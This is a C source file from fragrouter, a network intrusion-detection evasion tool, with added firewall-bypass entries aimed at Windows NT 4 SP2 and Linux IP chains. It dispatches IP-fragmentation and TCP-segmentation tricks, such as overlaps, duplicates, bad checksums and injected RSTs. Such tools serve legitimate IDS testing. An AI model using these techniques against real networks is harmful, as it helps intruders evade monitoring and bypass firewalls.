/*
  attack.c

  Original fragrouter code by Dug Song
  Hax by lorg0r <lorgor@yahoo.com>

  Copyright (c) 1999 Anzen Computing. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions
  are met:
  
  1. Redistributions of source code must retain the above copyright
     notice, this list of conditions and the following disclaimer.
  2. Redistributions in binary form must reproduce the above copyright
     notice, this list of conditions and the following disclaimer in the
     documentation and/or other materials provided with the distribution.
  3. All advertising materials mentioning features or use of this software
     must display the following acknowledgement:
     This product includes software developed by Anzen Computing.
  4. Neither the name of Anzen Computing nor the names of its
     contributors may be used to endorse or promote products derived
     from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
  WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
  MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
  DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
  GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
  INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
  IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

  $Id: attack.c,v 1.8 2001/01/17 19:45:06 asdfg Exp $
*/

#include "config.h"

#ifdef STDC_HEADERS
#include <stdio.h>
#endif
#include <pcap.h>
#include <string.h>
#include "attack.h"
#include "sniff.h"
#include "ip_frag.h"
#include "tcp_seg.h"
#include "misc.h"
#include "send.h"

int attack_type;
int attack_num;

char *attack_list[] = {
  NULL, /* ATTACK_BASE */
  "base-1: normal IP forwarding",
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL, /* ATTACK_FRAG */
  "frag-1: ordered 8-byte IP fragments",
  "frag-2: ordered 24-byte IP fragments",
  "frag-3: ordered 8-byte IP fragments, one out of order",
  "frag-4: ordered 8-byte IP fragments, one duplicate",
  "frag-5: out of order 8-byte fragments, one duplicate",
  "frag-6: ordered 8-byte fragments, marked last frag first",
  "frag-7: ordered 16-byte fragments, fwd-overwriting",
  NULL,
  NULL,
  NULL, /* ATTACK_TCP */
  "tcp-1:  3-whs, bad TCP checksum FIN/RST, ordered 1-byte segments",
  NULL, /* "tcp-2:  3-whs, ordered 1-byte segments, sequence number wrap" */
  "tcp-3:  3-whs, ordered 1-byte segments, one duplicate",
  "tcp-4:  3-whs, ordered 1-byte segments, one overwriting",
  "tcp-5:  3-whs, ordered 2-byte segments, fwd-overwriting",
  NULL, /* "tcp-6:  ordered 1-byte segments, sequence number jump" */
  "tcp-7:  3-whs, ordered 1-byte segments, interleaved null segments",
  "tcp-8:  3-whs, ordered 1-byte segments, one out of order",
  "tcp-9:  3-whs, out of order 1-byte segments",
  NULL, /* ATTACK_TCBC */
  NULL, /* "tcbc-1: no handshake, ordered 1-byte segments" */
  "tcbc-2: 3-whs, ordered 1-byte segments, interleaved SYNs",
  "tcbc-3: ordered 1-byte null segments, 3-whs, ordered 1-byte segments",
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL, /* ATTACK_TCBT */
  "tcbt-1: 3-whs, RST, 3-whs, ordered 1-byte segments",
  NULL, /* "tcbt-2: 3-whs, ordered 1-byte segments, RST, ordered 1-byte segments" */
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL, /* ATTACK_INSERT */
  NULL, /* "ins-1:  3-whs, ordered 1-byte segments, bad IP checksums" */
  "ins-2:  3-whs, ordered 1-byte segments, bad TCP checksums",
  "ins-3:  3-whs, ordered 1-byte segments, no ACK set",
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL, /* ATTACK_EVADE */
  NULL, /* "evad-1: 3-whs, data in SYN" */
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL, /* ATTACK_MISC */
  "misc-1: Windows NT 4 SP2 - http://www.dataprotect.com/ntfrag/",
  "misc-2: Linux IP chains - http://www.dataprotect.com/ipchains/",
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL
};

char *
attack_string(int type, int num)
{
  if (type >= 0 && type < ATTACK_MAX &&
      num > 0 && num < 10)
    return attack_list[type + num];

  return NULL;
}

int
attack_baseline(u_char *pkt, int len)
{
  return (send_packet(pkt, len));
}

int
attack_frag(u_char *pkt, int len)
{
  ELEM *f, *frag = NULL;

  if (attack_num == 1) {
    frag = ip_frag_make(pkt, len, 8);
  }
  else if (attack_num == 2) {
    frag = ip_frag_make(pkt, len, 24);
  }
  else if (attack_num == 3) {
    frag = ip_frag_make(pkt, len, 8);
    if ((f = list_last(frag)) != NULL)
      list_swap(f->prev);
  }
  else if (attack_num == 4) {
    frag = ip_frag_make(pkt, len, 8);
    if ((f = list_last(frag)) != NULL)
      list_dup(f->prev);
  }
  else if (attack_num == 5) {
    frag = ip_frag_make(pkt, len, 8);
    if ((f = list_last(frag)) != NULL) {
      list_dup(f->prev);
      list_randomize(f->head);
    }
  }
  else if (attack_num == 6) {
    frag = ip_frag_make(pkt, len, 8);
    if ((f = list_last(frag)) != NULL)
      list_swap(f);
  }
  else if (attack_num == 7) {
    frag = ip_frag_make(pkt, len, 16);
    if (frag)
      ip_frag_add_overwrite(frag);
  }
  else return 0;

  if (frag) {
    send_list(frag->head);
    list_free(frag->head);
    return 1;
  }
  return (attack_baseline(pkt, len));
}


int
attack_misc(u_char *pkt, int len)
{
  ELEM *frag = NULL;

  if (attack_num == 1) {
    frag = misc_nt4sp2(pkt, len, 8);
  }
  if (attack_num == 2) {
    frag = misc_linuxipchains(pkt, len);
  }
  if (frag) {
    send_list(frag->head);
    list_free(frag->head);
    return 1;
  }
  return (attack_baseline(pkt, len));
}

int
attack_tcbc(u_char *pkt, int len)
{
  ELEM *seg = NULL;

  if (attack_num == 2) {
    seg = tcp_seg_make(pkt, len, 1);
    if (seg)
      seg = tcp_seg_interleave_syns(seg);
  }
  else if (attack_num == 3) {
    seg = tcp_seg_make(pkt, len, 1);
    if (!seg)
      seg = tcp_seg_prepend_junk(pkt, len);
  }
  else return 0;
  
  if (seg) {
    send_list(seg->head);
    list_free(seg->head);
    return 1;
  }
  return (attack_baseline(pkt, len));
}

int
attack_tcbt(u_char *pkt, int len)
{
  ELEM *seg = NULL;

  if (attack_num == 1) {
    seg = tcp_seg_make(pkt, len, 1);
    if (!seg)
      seg = tcp_seg_prepend_connection(pkt, len);
  }
  if (seg) {
    send_list(seg->head);
    list_free(seg->head);
    return 1;
  }
  return (attack_baseline(pkt, len));
}

int
attack_insert(u_char *pkt, int len)
{
  ELEM *seg = NULL;

  if (attack_num == 2) {
    seg = tcp_seg_make(pkt, len, 1);
    if (seg)
      tcp_seg_whack_checksums(seg);
  }
  else if (attack_num == 3) {
    seg = tcp_seg_make(pkt, len, 1);
    if (seg)
      tcp_seg_whack_acks(seg);
  }
  else return 0;
  
  if (seg) {
    send_list(seg->head);
    list_free(seg->head);
    return 1;
  }
  return (attack_baseline(pkt, len));
}

int
attack_tcp(u_char *pkt, int len)
{
  ELEM *s, *seg = NULL;
  
  if (attack_num == 1) {
    seg = tcp_seg_make(pkt, len, 1);
    if (!seg)
      seg = tcp_seg_prepend_fakeclose(pkt, len);
  }
  else if (attack_num == 3) {
    seg = tcp_seg_make(pkt, len, 1);
    if ((s = list_last(seg)) != NULL)
      list_dup(s->prev);
  }
  else if (attack_num == 4) {
    seg = tcp_seg_make(pkt, len, 1);
    if ((s = list_last(seg)) != NULL) {
      s = list_dup(s->prev);
      tcp_seg_null_payload(s);
      list_swap(s);
    }
  }
  else if (attack_num == 5) {
    seg = tcp_seg_make(pkt, len, 2);
    if (seg)
      tcp_seg_interleave_overwrites(seg);
  }
  else if (attack_num == 7) {
    seg = tcp_seg_make(pkt, len, 1);
    if (seg)
      tcp_seg_interleave_nulls(seg);
  }
  else if (attack_num == 8) {
    seg = tcp_seg_make(pkt, len, 1);
    if ((s = list_last(seg)) != NULL)
      list_swap(s->prev);
  }
  else if (attack_num == 9) {
    seg = tcp_seg_make(pkt, len, 1);
    if (seg != NULL)
      list_randomize(seg);
  }
  if (seg) {
    send_list(seg->head);
    list_free(seg->head);
    return 1;
  }
  return (attack_baseline(pkt, len));
}



attack_handler
attack_init(int type, int num, char *ebuf)
{
  void *attack = NULL;

  if (!attack_string(type, num)) {
    strcpy(ebuf, "attack unimplemented");
    return NULL;
  }
  else if (type == ATTACK_BASE)
    attack = attack_baseline;
  else if (type == ATTACK_FRAG)
    attack = attack_frag;
  else if (type == ATTACK_TCP)
    attack = attack_tcp;
  else if (type == ATTACK_TCBC)
    attack = attack_tcbc;
  else if (type == ATTACK_TCBT)
    attack = attack_tcbt;
  else if (type == ATTACK_INSERT)
    attack = attack_insert;
  else if (type == ATTACK_MISC)
    attack = attack_misc;

  attack_type = type;
  attack_num = num;
  
  return attack;
}

